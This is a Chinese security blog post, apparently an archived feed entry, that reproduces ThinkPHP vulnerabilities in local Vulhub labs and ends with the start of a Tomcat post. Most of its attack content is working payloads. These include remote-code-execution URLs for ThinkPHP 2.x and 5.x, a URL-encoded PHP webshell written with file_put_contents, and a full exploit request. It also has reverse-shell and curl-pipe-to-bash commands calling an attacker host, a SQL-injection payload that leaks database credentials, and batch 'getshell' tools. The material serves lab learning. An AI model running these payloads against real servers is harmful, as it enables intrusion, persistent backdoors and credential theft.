title="本地漏洞复现"></a>本地漏洞复现</h2><h3 id="Poc1-phpinfo"><a href="#Poc1-phpinfo" class="headerlink" title="Poc1-phpinfo"></a>Poc1-phpinfo</h3><pre class="line-numbers language-none"><code class="language-none">/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1%20and%20it%27ll%20execute%20the%20phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214441.png" alt="image-20210516104439807"></p><h3 id="Poc2-写入一句话"><a href="#Poc2-写入一句话" class="headerlink" title="Poc2-写入一句话"></a>Poc2-写入一句话</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php eval($_POST['a']);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行URL编码</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214442.png" alt="image-20210516104729763"></p><p>最后的payload</p><pre class="line-numbers language-none"><code class="language-none">/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%61%27%5d%29%3b%3f%3e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214443.png" alt="image-20210516104921607"></p><p>这样子就是执行成功的</p><p>去底层看一下 这个<code>shell.php</code>是被写到哪个目录下了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214444.png" alt="image-20210516105006426"></p><p>是成功写入的</p><p>蚁剑连接一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214445.png" alt="image-20210516105219445"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214446.png" alt="image-20210516105231918"></p><p>可以看到是成功的</p><h2 id="Vulhub-Thinkphp复现"><a href="#Vulhub-Thinkphp复现" class="headerlink" title="Vulhub-Thinkphp复现"></a>Vulhub-Thinkphp复现</h2><h3 id="Thinkphp-2-x-任意代码执行漏洞"><a href="#Thinkphp-2-x-任意代码执行漏洞" class="headerlink" title="Thinkphp 2.x 任意代码执行漏洞"></a>Thinkphp 2.x 任意代码执行漏洞</h3><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>ThinkPHP2.x版本中，使用 <code>preg_replace</code>的<code>/e</code>模式匹配路由</p><pre class="line-numbers language-none"><code class="language-none">$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>导致用户的输入参数被插入<code>双引号</code>中执行，造成任意代码执行漏洞</p><p><strong>ThinkPHP3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞</strong></p><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>ThinkPHP 2.x</p><h4 id="漏洞原理详解"><a href="#漏洞原理详解" class="headerlink" title="漏洞原理详解"></a>漏洞原理详解</h4><p>由于是<code>preg_replace</code>这个函数引起的漏洞，所以先来看看<code>preg_replace</code>这个函数</p><p>这个函数是个替换函数，而且支持正则，使用方式如下</p><pre class="line-numbers language-none"><code class="language-none">preg_replace('正则规则','替换字符','目标字符')<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个函数的3个参数，结合起来的意思是：</p><p>如果目标字符存在符合正则规则的字符，那么就替换为替换字符，如果此时正则规则中使用了<code>/e</code>这个修饰符，则存在代码执行漏洞</p><pre class="line-numbers language-none"><code class="language-none">e --&gt;配合函数preg_replace()使用，可以把匹配来的字符串当作正则表达式执行/e--&gt;可执行模式，此为PHP专有参数，例如 preg_replace函数。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>本地测试直接使用下面这行代码测试即可</p><p>沙箱地址：<a href="http://sandbox.onlinephpfunctions.com/">http://sandbox.onlinephpfunctions.com/</a></p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><pre class="line-numbers language-none"><code class="language-none">cd vulhub-master/thinkphp/2-rcesudo docker-compose up -d <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214447.png" alt="image-20210516112631321"></p><p>访问一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214448.png" alt="image-20210516112904397"></p><h4 id="在线沙箱-进行尝试"><a href="#在线沙箱-进行尝试" class="headerlink" title="在线沙箱 进行尝试"></a>在线沙箱 进行尝试</h4><p>沙箱地址： <a href="http://sandbox.onlinephpfunctions.com/">http://sandbox.onlinephpfunctions.com/</a></p><pre class="line-numbers language-none"><code class="language-none">&lt;?php@preg_replace('/test/e','print_r("a001");','just test');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>7.0以下的版本 存在/e 就可以任意代码执行</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214449.png" alt="image-20210516113527294"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214450.png" alt="image-20210516113608816"></p><h4 id="代码审计-docker底层分析"><a href="#代码审计-docker底层分析" class="headerlink" title="代码审计-docker底层分析"></a>代码审计-docker底层分析</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214451.png" alt="image-20210516113821945"></p><p>找寻一下这个函数</p><pre class="line-numbers language-none"><code class="language-none">find . -name '*.php' | xargs grep -n 'preg_replace'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>复制出来 搞到本地</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214452.png" alt="image-20210516113959977"></p><p>存在<code>/e</code>修饰符的脚本</p><pre class="line-numbers language-none"><code class="language-none">./ThinkPHP/Mode/Lite/Dispatcher.class.php:115: $res = preg_replace('@(\w+)'.C('URL_PATHINFO_DEPR').'([^,\/]+)@e', '$pathInfo[\'\\1\']="\\2";', $_SERVER['PATH_INFO']);./ThinkPHP/Lib/Think/Util/HtmlCache.class.php:57: $rule = preg_replace('/{\$(_\w+)\.(\w+)\|(\w+)}/e',"\\3(\$\\1['\\2'])",$rule);./ThinkPHP/Lib/Think/Util/HtmlCache.class.php:58: $rule = preg_replace('/{\$(_\w+)\.(\w+)}/e',"\$\\1['\\2']",$rule);./ThinkPHP/Lib/Think/Util/HtmlCache.class.php:60: $rule = preg_replace('/{(\w+)\|(\w+)}/e',"\\2(\$_GET['\\1'])",$rule);./ThinkPHP/Lib/Think/Util/HtmlCache.class.php:61: $rule = preg_replace('/{(\w+)}/e',"\$_GET['\\1']",$rule);./ThinkPHP/Lib/Think/Util/HtmlCache.class.php:68: $rule = preg_replace('/{|(\w+)}/e',"\\1()",$rule);./ThinkPHP/Lib/Think/Util/Dispatcher.class.php:102: $res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));./ThinkPHP/Lib/Think/Util/Dispatcher.class.php:224: $res = preg_replace('@(\w+)\/([^,\/]+)@e', '$var[\'\\1\']="\\2";', implode('/',$paths));./ThinkPHP/Lib/Think/Util/Dispatcher.class.php:239: $res = preg_replace('@(\w+)\/([^,\/]+)@e', '$var[\'\\1\']="\\2";', str_replace($matches[0],'',$regx));./ThinkPHP/Common/extend.php:215: $str = preg_replace('#color="(.*?)"#', 'style="color: \\1"', $str);./ThinkPHP/Common/functions.php:145: return ucfirst(preg_replace("/_([a-zA-Z])/e", "strtoupper('\\1')", $name));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>漏洞的关键就是这里了 代码位置就是在这里了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214453.png" alt="image-20210516114455185"></p><h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><pre class="line-numbers language-none"><code class="language-none">/index.php?s=/index/index/name/${@phpinfo()}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">/index.php?s=/index/index/name/$%7B@phpinfo()%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214454.png" alt="image-20210516114716456"></p><h4 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h4><pre class="line-numbers language-none"><code class="language-none">/index.php?s=a/b/c/${@print(eval($_POST[1]))}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行抓包</p><p>改成POST的包</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214455.png" alt="image-20210516115146602"></p><pre class="line-numbers language-none"><code class="language-none">1=system('id');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行成功</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214456.png" alt="image-20210516115253775"></p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/192.168.175.130/8888 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214457.png" alt="image-20210516211216935"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214458.png" alt="image-20210516211239687"></p><p>nc开启监听</p><pre class="line-numbers language-none"><code class="language-none">nc -lvvp 8888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214459.png" alt="image-20210516211322279"></p><p>python开启http服务</p><pre class="line-numbers language-none"><code class="language-none">python -m SimpleHTTPServer 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214500.png" alt="image-20210516211311881"></p><p>进行执行</p><pre class="line-numbers language-none"><code class="language-none">1=system("curl 192.168.175.130:9999/shell.sh | bash");<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214501.png" alt="image-20210516211508627"></p><p>nc拿到shell</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214502.png" alt="image-20210516211559258"></p><p>蚁剑连接的话</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.175.209:8080/index.php?s=a/b/c/${@print(eval($_POST[1]))}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214503.png" alt="image-20210516211831135"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214504.png" alt="image-20210516211848214"></p><h3 id="Thinkphp5-5-0-22-5-1-29远程代码执行漏洞"><a href="#Thinkphp5-5-0-22-5-1-29远程代码执行漏洞" class="headerlink" title="Thinkphp5-5.0.22/5.1.29远程代码执行漏洞"></a>Thinkphp5-5.0.22/5.1.29远程代码执行漏洞</h3><h4 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>ThinkPHP是在中国使用极为广泛的PHP开发框架。在其版本5中，由于框架错误地处理了控制器名称，因此如果网站未启用强制路由(默认设置)，则该框架可以执行任何方法，从而导致RCE漏洞。</p><h4 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h4><pre class="line-numbers language-none"><code class="language-none">5.0.22/5.1.29<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><pre class="line-numbers language-none"><code class="language-none">cd vulhub-master/thinkphp/5-rcesudo docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214505.png" alt="image-20210516212604870"></p><p>成功访问</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214506.png" alt="image-20210516212632637"></p><h4 id="漏洞验证-1"><a href="#漏洞验证-1" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><pre class="line-numbers language-none"><code class="language-none">/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1%20and%20it%27ll%20execute%20the%20phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214507.png" alt="image-20210516212649252"></p><h4 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h4><pre class="line-numbers language-none"><code class="language-none">/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214508.png" alt="image-20210516212706895"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214509.png" alt="image-20210516212729751"></p><h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php eval($_POST['a']);?&gt;URL编码%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%61%27%5d%29%3b%3f%3e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214510.png" alt="image-20210516212512972"></p><p>最后的payload–&gt;shell.php</p><pre class="line-numbers language-none"><code class="language-none">/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%61%27%5d%29%3b%3f%3e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>写入成功</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214511.png" alt="image-20210516212757138"></p><p>去docker底层看一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214512.png" alt="image-20210516213253882"></p><p>蚁剑连接</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214513.png" alt="image-20210516212911974"></p><h3 id="Thinkphp5-0-23远程代码执行漏洞"><a href="#Thinkphp5-0-23远程代码执行漏洞" class="headerlink" title="Thinkphp5.0.23远程代码执行漏洞"></a>Thinkphp5.0.23远程代码执行漏洞</h3><h4 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>ThinkPHP是在中国使用极为广泛的PHP开发框架。在其版本5.0（&lt;5.0.24）中，框架在获取请求方法时会错误地对其进行处理，就是在获取 method的方法中没有正确处理方法名，这使攻击者可以调用 Request类的任何方法，攻击者可以调用 Request类任意方法并构造利用链，从而导致远程代码执行漏洞</p><h4 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h4><pre class="line-numbers language-none"><code class="language-none">Thinkphp5.0.0~5.0.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h4><pre class="line-numbers language-none"><code class="language-none">Thinkphp 5.0.0~ 5.0.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><pre class="line-numbers language-none"><code class="language-none">cd vulhub-master/thinkphp/5.0.23-rcesudo docker-compose up -d <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214514.png" alt="image-20210517092443132"></p><p>访问一下靶机</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214515.png" alt="image-20210517092510037"></p><h4 id="漏洞验证-2"><a href="#漏洞验证-2" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>进行抓包</p><p>进行转换</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214516.png" alt="image-20210517092901244"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214517.png" alt="image-20210517092957870"></p><p>这里给出完整的数据包</p><pre class="line-numbers language-none"><code class="language-none">POST /index.php?s=captcha HTTP/1.1Host: 192.168.175.209:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheContent-Type: application/x-www-form-urlencodedContent-Length: 72_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="反弹shell-1"><a href="#反弹shell-1" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>把反弹shell 写到shell.sh中</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214518.png" alt="image-20210517093330723"></p><p>python开启http服务</p><pre class="line-numbers language-none"><code class="language-none">python -m SimpleHTTPServer 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>nc开启监听</p><pre class="line-numbers language-none"><code class="language-none">nc -vlp 8888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行执行</p><pre class="line-numbers language-none"><code class="language-none">curl 192.168.175.130:9999/shell.sh | bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214519.png" alt="image-20210517093509746"></p><p>成功反弹shell</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214520.png" alt="image-20210517093530918"></p><h3 id="Thinkphp敏感信息泄露"><a href="#Thinkphp敏感信息泄露" class="headerlink" title="Thinkphp敏感信息泄露"></a>Thinkphp敏感信息泄露</h3><h4 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>传入的某参数在绑定编译指令的时候又没有安全处理，预编译的时候导致SQL异常报错。然而 thinkphp5默认开启debug模式，在漏洞环境下构造错误旳SQL语法会泄漏数据库账户和密码。</p><h4 id="影响版本-3"><a href="#影响版本-3" class="headerlink" title="影响版本"></a>影响版本</h4><pre class="line-numbers language-none"><code class="language-none">ThinkPhP &lt;5.1.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace app\index\controller;use app\index\model\User;class Index{ public function index() { $ids = input('ids/a'); $t = new User(); $result = $t-&gt;where('id', 'in', $ids)-&gt;select();}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由上述代码可知，这里用助手函数input定义了参数ids的类型是数组</p><pre class="line-numbers language-none"><code class="language-none">protected function parseMhere ($where, $options){ $whereStr = $this -&gt; buildWhere($where, $options); if (! empty($options['soft_delete '])) { list ($field, $condition) = $options['soft_delete']; $binds = $this -&gt; query -&gt;getF ieldsBind($optlons); $whereStr = $whereStr ? '(' .$whereStr . ') AND ' : ' '; $whereStr = $whereStr. $this -&gt; parseWhereIten($field, $condition, ' ', $options, $binds); } return empty($wherestr) ? ' ' : ' WHERE ' . $uhereStr;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着去找 <code>where('id'，'in'，$ids)</code>定义的内容，找到了最核心的方法 buildWhere和 parseWhereltem<br>接着找到定义<code>'in'</code>的位置</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php...$bindName = $bindName ?: 'where_' . str_replace(['.', '-'], '_', $field);if (preg_match('/\W/', $bindName)) {//处理带非单词字符的字段名 $bindName = md5($bindName);}...} elseif (in_array($exp, ['NOT IN', 'IN'])) { // IN ັᧃ if ($value instanceof \Closure) { $whereStr .= $key . ' ' . $exp . ' ' . $this-&gt;parseClosure($value); } else { $value = is_array($value) ? $value : explode(',', $value); if (array_key_exists($field, $binds)) { $bind = []; $array = []; foreach ($value as $k =&gt; $v) { if ($this-&gt;query-&gt;isBind($bindName . '_in_' . $k)) { $bindKey = $bindName . '_in_' . uniqid() . '_' . $k; } else { $bindKey = $bindName . '_in_' . $k; } $bind[$bindKey] = [$v, $bindType]; $array[] = ':' . $bindKey; } $this-&gt;query-&gt;bind($bind); $zone = implode(',', $array); } else { $zone = implode(',', $this-&gt;parseValue($value, $field)); } $whereStr .= $key . ' ' . $exp . ' (' . (empty($zone) ? "''" : $zone) . ')'; }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码当引入了in或者 not in的时候遍历value的key和 value。</p><p>而key在绑定编译指令的时候又没有安全处理，所以导致了在预编译的时候SQL异常。</p><h4 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>这边在kali上用P牛的靶场</p><p>乌班图那边有点问题</p><p>kali安装docker</p><pre class="line-numbers language-none"><code class="language-none">sudo apt install docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">sudo systemctl start docker #启动dockercd /vulhub-master/thinkphp/in-sqlinjectionsudo docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214521.png" alt="image-20210517102044583"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214522.png" alt="image-20210517102330781"></p><p>进行访问</p><h4 id="漏洞验证-3"><a href="#漏洞验证-3" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><pre class="line-numbers language-none"><code class="language-none">/index.php?ids[]=1&amp;ids[]=2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214523.png" alt="image-20210517104950942"></p><h4 id="Poc-1"><a href="#Poc-1" class="headerlink" title="Poc"></a>Poc</h4><pre class="line-numbers language-none"><code class="language-none">/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214524.png" alt="image-20210517105047474"></p><p>枚举到数据库的账号和密码</p><h2 id="Thinkphp自动化武器"><a href="#Thinkphp自动化武器" class="headerlink" title="Thinkphp自动化武器"></a>Thinkphp自动化武器</h2><h3 id="Thinkphp综合利用工具"><a href="#Thinkphp综合利用工具" class="headerlink" title="Thinkphp综合利用工具"></a>Thinkphp综合利用工具</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214525.png" alt="image-20210517103651341"></p><h3 id="ThinkPHPBatchPoc群扫"><a href="#ThinkPHPBatchPoc群扫" class="headerlink" title="ThinkPHPBatchPoc群扫"></a>ThinkPHPBatchPoc群扫</h3><p>执行看一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214526.png" alt="image-20210517104229137"></p><p>可以去底层看一下</p><p>我们可以手动添加Poc</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214527.png" alt="image-20210517104321007"></p><p>它可以自动补充http头</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214528.png" alt="image-20210517104345163"></p><p>执行 </p><pre class="line-numbers language-none"><code class="language-none">-u 单个URL-f 执行文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="TPscan"><a href="#TPscan" class="headerlink" title="TPscan"></a>TPscan</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214529.png" alt="image-20210517112239340"></p><h3 id="AttackWebFrameworkTools"><a href="#AttackWebFrameworkTools" class="headerlink" title="AttackWebFrameworkTools"></a>AttackWebFrameworkTools</h3><p>项目地址：<a href="https://github.com/Anonymous-ghost/AttackWebFrameworkTools">GitHub - Anonymous-ghost/AttackWebFrameworkTools: 本软件首先集成危害性较大前台rce(无需登录,或者登录绕过执行rce)。反序列化(利用链简单)。上传getshell。sql注入等高危漏洞直接就可以拿权限出数据。其次对一些构造复杂exp漏洞进行检测。傻瓜式导入url即可实现批量测试,能一键getshell检测绝不sql注入或者不是只检测。其中thinkphp 集成所有rce Exp Struts2漏洞集成了shack2 和k8 漏洞利用工具所有Exp并对他们的exp进行优化和修复此工具的所集成漏洞全部是基于平时实战中所得到的经验从而写入到工具里。例如:通达oA一键getshell实战测试 struts2一键getshell 等等</a></p><p>需要先安装4.5的.NET Framework</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214530.png" alt="image-20210517110049535"></p><p>然后要新建两个文本文档</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214531.png" alt="image-20210517112647614"></p><h3 id="Thinkphp攻击武器"><a href="#Thinkphp攻击武器" class="headerlink" title="Thinkphp攻击武器"></a>Thinkphp攻击武器</h3><p>双击打开就可以了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214532.png" alt="image-20210517113137966"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210717214533.png" alt="image-20210517113117606"></p>]]></content>
      
      
      <categories>
          
          <category> 服务攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Thinkphp小结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat小结</title>
      <link href="/2021/10/28/tomcat/"/>
      <url>/2021/10/28/tomcat/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Tomcat服务器是一个免费的开放源代码的web应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP程序的首选。可以这样认为，当在一台机器上配置好 Apache服务器，可利用它响应HTML页面的访问请求。实际上 Tomcat是 Apache服务器的扩展，但运行时它是独立运行的，所以当运行 tomcat时，它实际上作为一个与 Apache独立的进程单独运行的。</p><p><strong>目前版本型号7~10版本</strong></p><p><strong>默认端口：8080</strong></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>首先要有java的环境</p><p><strong>注意：Tomcat的版本对与JAVA版本以及相应的JSP和 Servlet都是有要求的，Tomcat8版本以上的是需要Java7及以后的版本，所以需要对应JDK的版本来下载Tomcat的版本</strong></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061945.png" alt="1619271446048"></p><p>然后安装Tomcat  一路默认下来 就ok了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061946.png" alt="1619263844479"></p><p>可以看到它的8080端口 已经开启了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061947.png" alt="1619263320303"></p><p>访问一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061948.png" alt="1619275501351"></p><h2 id="Tomcat分析"><a href="#Tomcat分析" class="headerlink" title="Tomcat分析"></a>Tomcat分析</h2><h3 id="主要文件"><a href="#主要文件" class="headerlink" title="主要文件"></a>主要文件</h3><pre class="line-numbers language-none"><code class="language-none">1.server.xml：配置 tomcat启动的端口号、host主机、Context等2.web.xml:部署描述文件，这个web.xml中描述了一些默认的 servlet，部署每个 webapp时，都会调用这个文件，配置该web应用的默认 servlet 3：tomcat-users.xml:tomcat的用户密码与权限。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061949.png" alt="1619276500737"></p><h3 id="上传目录"><a href="#上传目录" class="headerlink" title="上传目录"></a>上传目录</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061950.png" alt="1619276550079"></p><h2 id="Tomcat渗透"><a href="#Tomcat渗透" class="headerlink" title="Tomcat渗透"></a>Tomcat渗透</h2><h3 id="Tomcat任意文件写入-CVE-2017-12615）"><a href="#Tomcat任意文件写入-CVE-2017-12615）" class="headerlink" 